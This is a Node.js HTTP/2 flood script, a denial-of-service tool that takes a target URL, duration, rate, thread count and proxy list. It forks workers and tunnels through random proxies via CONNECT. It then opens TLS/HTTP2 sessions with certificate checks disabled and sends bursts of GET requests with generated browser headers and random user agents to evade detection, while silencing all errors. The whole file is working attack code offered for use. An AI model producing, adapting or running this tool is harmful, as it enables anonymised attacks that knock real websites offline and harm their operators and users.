#!/usr/bin/env node
/* TLS PRO - HTTP/2 Flood with Header Generator */

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const { HeaderGenerator } = require('header-generator');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
    console.log(`Usage: node ${require('path').basename(__filename)} target time rate thread proxyfile`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

let proxies = fs.readFileSync(args.proxyFile, "utf-8").trim().split(/[\r\n]+/).filter(Boolean);
const parsedTarget = url.parse(args.target);

let headerGenerator = new HeaderGenerator({
    browsers: [{name: "firefox", minVersion: 100, httpVersion: "2"}],
    devices: ["desktop"],
    operatingSystems: ["windows"],
    locales: ["en-US", "en"]
});

// Generate random headers
const randomHeaders = headerGenerator.getHeaders();

const headers = {
    ":method": "GET",
    ":path": parsedTarget.path,
    ":scheme": "https",
    ":authority": parsedTarget.host,
    "accept": randomHeaders['accept'] || "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": randomHeaders['accept-language'] || "en-US,en;q=0.5",
    "accept-encoding": randomHeaders['accept-encoding'] || "gzip, deflate, br",
    "referer": "https://google.com",
    "upgrade-insecure-requests": randomHeaders['upgrade-insecure-requests'] || "1",
    "TE": "trailers",
    "Connection": "keep-alive"
};

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) cluster.fork();
} else {
    setInterval(runFlooder);
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function connectProxy(proxyAddr, callback) {
    const [host, port] = proxyAddr.split(":");
    const payload = `CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    
    const connection = net.connect({ host, port: ~~port });
    connection.setTimeout(1000000);
    connection.setKeepAlive(true, 60000);
    
    connection.on("connect", () => connection.write(payload));
    connection.on("data", chunk => {
        if (chunk.toString().includes("HTTP/1.1 200")) return callback(connection);
        connection.destroy();
        callback(null);
    });
    connection.on("timeout", () => { connection.destroy(); callback(null); });
    connection.on("error", () => { connection.destroy(); callback(null); });
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const userAgent = new UserAgent().toString();
    
    headers["user-agent"] = userAgent;
    
    connectProxy(proxyAddr, (connection) => {
        if (!connection) return;
        connection.setKeepAlive(true, 60000);
        
        const tlsConn = tls.connect({
            ALPNProtocols: ['h2'],
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            socket: connection,
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK"
        });
        tlsConn.setKeepAlive(true, 600000);
        
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: { headerTableSize: 65536, maxConcurrentStreams: 1000, initialWindowSize: 6291456, enablePush: false },
            createConnection: () => tlsConn
        });
        
        client.settings({ headerTableSize: 65536, maxConcurrentStreams: 20000, initialWindowSize: 6291456, enablePush: false });
        
        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const req = client.request(headers);
                    req.on("response", () => { req.close(); req.destroy(); });
                    req.end();
                }
            }, 1000);
        });
        
        client.on("close", () => { try { client.destroy(); connection.destroy(); } catch(e) {} });
        client.on("error", () => { try { client.destroy(); connection.destroy(); } catch(e) {} });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);
